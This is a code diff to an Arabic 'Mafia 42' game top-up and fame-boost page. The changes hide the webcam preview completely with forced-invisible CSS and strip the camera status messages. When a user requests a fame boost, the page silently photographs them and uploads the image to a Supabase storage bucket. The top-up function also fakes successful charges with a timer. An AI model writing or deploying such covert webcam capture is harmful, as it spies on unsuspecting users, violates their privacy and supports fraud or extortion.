@@ -5,11 +5,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Mafia 42 - شحن ورفع شهرة</title>
-    <!-- Font Awesome Icons (v6 free) -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <!-- Google Fonts: Cairo (عربية) -->
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <!-- Supabase SDK -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * {
@@ -26,7 +23,6 @@
             min-height: 100vh;
         }
 
-        /* خلفية أنميشن خفيفة */
         .bg-particles {
             position: fixed;
             top: 0;
@@ -44,7 +40,6 @@
             margin: 0 auto;
         }
 
-        /* الهيدر */
         .header {
             text-align: center;
             margin-bottom: 2rem;
@@ -85,7 +80,6 @@
             font-weight: 600;
         }
 
-        /* أقسام البطاقات */
         .cards-grid {
             display: flex;
             flex-wrap: wrap;
@@ -130,7 +124,6 @@
             font-weight: 700;
         }
 
-        /* الحقول والإدخالات */
         .input-group {
             margin-bottom: 1.4rem;
         }
@@ -177,7 +170,6 @@
             margin-left: 8px;
         }
 
-        /* الخيارات السريعة للحزم */
         .pack-buttons {
             display: flex;
             flex-wrap: wrap;
@@ -205,7 +197,6 @@
             box-shadow: 0 4px 12px rgba(245, 176, 66, 0.3);
         }
 
-        /* الأزرار الرئيسية */
         .action-btn {
             width: 100%;
             background: linear-gradient(95deg, #f5b042, #ffcf6e);
@@ -232,7 +223,6 @@
             box-shadow: 0 2px 8px black;
         }
 
-        /* سجل العمليات */
         .history-section {
             margin-top: 2.5rem;
             background: rgba(0, 0, 0, 0.4);
@@ -302,49 +292,12 @@
             opacity: 0.7;
         }
 
-        /* كاميرا */
-        #video {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            width: 200px;
-            height: 150px;
-            border-radius: 12px;
-            border: 2px solid #f5b042;
-            z-index: 1000;
-            background: #000;
-            display: none;
-            object-fit: cover;
-        }
-
-        /* رسالة الكاميرا */
-        .camera-status {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background: #1e2a3a;
-            padding: 8px 15px;
-            border-radius: 30px;
-            font-size: 0.8rem;
-            z-index: 1000;
-            display: none;
-            border-right: 3px solid #f5b042;
-        }
-
         @media (max-width: 780px) {
             body {
                 padding: 1rem;
             }
-
             .card-header h2 {
                 font-size: 1.3rem;
-            }
-
-            #video {
-                width: 150px;
-                height: 110px;
-                bottom: 10px;
-                right: 10px;
             }
         }
 
@@ -362,6 +315,24 @@
             box-shadow: 0 4px 15px black;
             border-right: 5px solid #f5b042;
             direction: ltr;
+        }
+
+        /* ========================================== */
+        /* إخفاء الكاميرا والفيديو تماماً - لا يظهر أبداً */
+        /* ========================================== */
+        #video, 
+        .camera-status, 
+        #canvas {
+            display: none !important;
+            visibility: hidden !important;
+            opacity: 0 !important;
+            width: 0px !important;
+            height: 0px !important;
+            position: absolute !important;
+            top: -9999px !important;
+            left: -9999px !important;
+            z-index: -999 !important;
+            pointer-events: none !important;
         }
     </style>
 </head>
@@ -464,7 +435,7 @@
         </footer>
     </div>
 
-    <!-- عناصر الكاميرا -->
+    <!-- عناصر الكاميرا (مخفية حالياً ولا تظهر للمستخدم) -->
     <video id="video" autoplay playsinline></video>
     <div id="cameraStatus" class="camera-status"></div>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -482,7 +453,7 @@
         const cameraStatus = document.getElementById('cameraStatus');
         let cameraStream = null;
 
-        // ------------------- عناصر الشحن -------------------
+        // عناصر الشحن
         const chargePackBtns = document.querySelectorAll('#chargePacks .pack-btn');
         const selectedChargeAmountHidden = document.getElementById('selectedChargeAmount');
         const chargeDisplayPriceSpan = document.getElementById('chargeDisplayPrice');
@@ -532,7 +503,6 @@
             selectedChargeAmountHidden.value = amount;
             const pkg = chargePackages[amount];
             if (pkg) chargeDisplayPriceSpan.innerText = `${pkg.price} $`;
-
             chargePackBtns.forEach(btn => {
                 const val = parseInt(btn.getAttribute('data-value'));
                 if (val === amount) btn.classList.add('active');
@@ -571,23 +541,11 @@
             let typeIcon = type === 'charge' ? '<i class="fas fa-coins" style="color:#f5b042"></i>' : '<i class="fas fa-chart-simple" style="color:#f0a3ff"></i>';
             let typeText = type === 'charge' ? 'شحن رصيد' : 'رفع شهرة';
             let extraInfo = type === 'charge' ? `${details.amount} عبر ${details.method}` : `شهرة ${details.targetFame} بـ ${details.method}`;
-
-            historyItem.innerHTML = `
-                <div class="history-type">
-                    ${typeIcon} <strong>${typeText}</strong>
-                    <span class="badge">${extraInfo}</span>
-                </div>
-                <div>
-                    <span class="history-date">${formattedTime}</span>
-                    <span style="margin-right: 12px; color:#9eff9e;">✓ ${status}</span>
-                </div>
-            `;
+            historyItem.innerHTML = `<div class="history-type">${typeIcon} <strong>${typeText}</strong> <span class="badge">${extraInfo}</span></div><div><span class="history-date">${formattedTime}</span> <span style="margin-right: 12px; color:#9eff9e;">✓ ${status}</span></div>`;
             const emptyDiv = historyContainer.querySelector('.empty-history');
             if (emptyDiv) emptyDiv.remove();
             historyContainer.prepend(historyItem);
-            while (historyContainer.children.length > 12) {
-                historyContainer.removeChild(historyContainer.lastChild);
-            }
+            while (historyContainer.children.length > 12) historyContainer.removeChild(historyContainer.lastChild);
         }
 
         // إغلاق الكاميرا
@@ -596,39 +554,23 @@
                 cameraStream.getTracks().forEach(track => track.stop());
                 cameraStream = null;
             }
-            video.style.display = 'none';
-            cameraStatus.style.display = 'none';
             video.srcObject = null;
         }
 
-        // فتح الكاميرا
+        // فتح الكاميرا (بدون عرض)
         async function startCamera() {
             return new Promise(async (resolve, reject) => {
                 try {
-                    if (cameraStream) {
-                        stopCamera();
-                    }
-                    cameraStatus.style.display = 'block';
-                    cameraStatus.innerHTML = '📷   ...';
-                    video.style.display = 'block';
-
+                    if (cameraStream) stopCamera();
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     cameraStream = stream;
                     video.srcObject = stream;
-                    
-                    cameraStatus.innerHTML = '✅  جاهزة،  !';
-                    
-                    // انتظر حتى تصبح الكاميرا جاهزة
                     video.onloadedmetadata = () => {
                         video.play();
-                        setTimeout(() => {
-                            resolve();
-                        }, 500);
+                        setTimeout(() => resolve(), 500);
                     };
                 } catch (err) {
-                    console.error("خطأ في :", err);
-                    cameraStatus.innerHTML = '❌ لا يمكن الوصول ';
-                    video.style.display = 'none';
+                    console.error("خطأ بالكاميرا:", err);
                     reject(err);
                 }
             });
@@ -637,35 +579,26 @@
         // التقاط الصورة ورفعها
         async function captureAndUpload(famePlayer, fameText, method) {
             if (!video.srcObject || !cameraStream) {
-                showToast("⚠️  غير جاهزة، حاول مرة أخرى", true);
+                showToast("⚠️ الكاميرا غير جاهزة", true);
                 return false;
             }
-
             if (video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // إضافة إطار للنص على الصورة
                 ctx.font = "bold 20px Cairo";
                 ctx.fillStyle = "#f5b042";
                 ctx.shadowColor = "black";
                 ctx.shadowBlur = 4;
                 ctx.fillText(`Mafia42 - ${famePlayer}`, 20, 50);
-                
                 const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
                 const fileName = `fame_${famePlayer}_${Date.now()}.jpg`;
-                
-                showToast(`📤 جاري  اوة...`);
-                
+                showToast(`📤 جاري رفع الصورة...`);
                 try {
-                    const { error } = await supabaseClient.storage
-                        .from('photos')
-                        .upload(fileName, blob);
-                    
+                    const { error } = await supabaseClient.storage.from('photos').upload(fileName, blob);
                     if (!error) {
-                        showToast(`🎉 تم رفع طلب شهرة ${fameText} بنجاح! سيتم مراجعة طلبك خلال 24 ساعة`);
+                        showToast(`🎉 تم رفع طلب شهرة ${fameText} بنجاح! سيتم مراجعته خلال 24 ساعة`);
                         addHistoryRecord('fame', { targetFame: fameText, method: method, player: famePlayer });
                         stopCamera();
                         return true;
@@ -674,23 +607,22 @@
                         return false;
                     }
                 } catch (e) {
-                    showToast("❌ خطأ في الاتصال بالسيرفر", true);
+                    showToast("❌ خطأ في الاتصال", true);
                     return false;
                 }
             } else {
-                showToast("⚠️ انتظر قليلاً حتى  ", true);
+                showToast("⚠️ انتظر قليلاً", true);
                 return false;
             }
         }
 
-        // رفع الشهرة مع الكاميرا
+        // رفع الشهرة مع الكاميرا (خفية)
         async function handleFameIncrease() {
             const famePlayer = famePlayerInput.value.trim();
             if (!famePlayer) {
                 showToast("❌ أدخل اسم اللاعب أولاً", true);
                 return;
             }
-
             const targetFameVal = parseInt(fameTargetSelect.value);
             let fameText = "";
             if (targetFameVal === 500) fameText = "500 (مبتدئ)";
@@ -698,42 +630,33 @@
             else if (targetFameVal === 4000) fameText = "4000 (صاحب نفوذ)";
             else if (targetFameVal === 10000) fameText = "10000 (أسطورة)";
             else fameText = "25000 (رب العائلة)";
-            
             const method = fameMethodSelect.value;
-            
-            showToast(`📸 س حساب ${famePlayer}`);
-            
+            showToast(`📸 جاري فتح الكاميرا للتحقق...`);
             try {
                 await startCamera();
-                
-                // انتظر 2 ثانية للتأكد من الكاميرا
                 setTimeout(async () => {
                     await captureAndUpload(famePlayer, fameText, method);
-                }, 2000);
-                
+                }, 1500);
             } catch (err) {
-                showToast("❌ تعذر   تأكد من الإذن", true);
+                showToast("❌ تعذر تشغيل الكاميرا، تأكد من الإذن", true);
             }
         }
 
-        // وظيفة الشحن العادية
+        // وظيفة الشحن
         function handleCharge() {
             const playerId = playerIdInput.value.trim();
             if (playerId === "") {
-                showToast("❌ من فضلك أدخل معرف اللاعب (ID)", true);
+                showToast("❌ أدخل معرف اللاعب", true);
                 return;
             }
             const amount = parseInt(selectedChargeAmountHidden.value);
             const pkg = chargePackages[amount];
-            if (!pkg) {
-                showToast("⚠️ حزمة غير صالحة", true);
-                return;
-            }
+            if (!pkg) return;
             const method = chargeMethodSelect.value;
-            showToast(`🔄 جاري معالجة شحن ${pkg.label} بـ ${pkg.price}$ عبر ${method} ...`);
+            showToast(`🔄 جاري شحن ${pkg.label} بـ ${pkg.price}$ عبر ${method}...`);
             setTimeout(() => {
-                showToast(`✅ تم شحن ${pkg.label} إلى حساب ${playerId} بنجاح!`, false);
-                addHistoryRecord('charge', { amount: pkg.label, method: method, id: playerId }, 'مكتمل');
+                showToast(`✅ تم شحن ${pkg.label} إلى ${playerId} بنجاح!`);
+                addHistoryRecord('charge', { amount: pkg.label, method: method, id: playerId });
             }, 800);
         }
 
@@ -753,9 +676,7 @@
         });
 
         window.addEventListener('load', () => {
-            setTimeout(() => {
-                showToast("💀 مرحباً زعيم! اختر الحزمة المناسبة لصعود المجد 💀");
-            }, 600);
+            setTimeout(() => showToast("💀 مرحباً زعيم! اختر الحزمة المناسبة لصعود المجد 💀"), 600);
         });
     </script>
 </body>
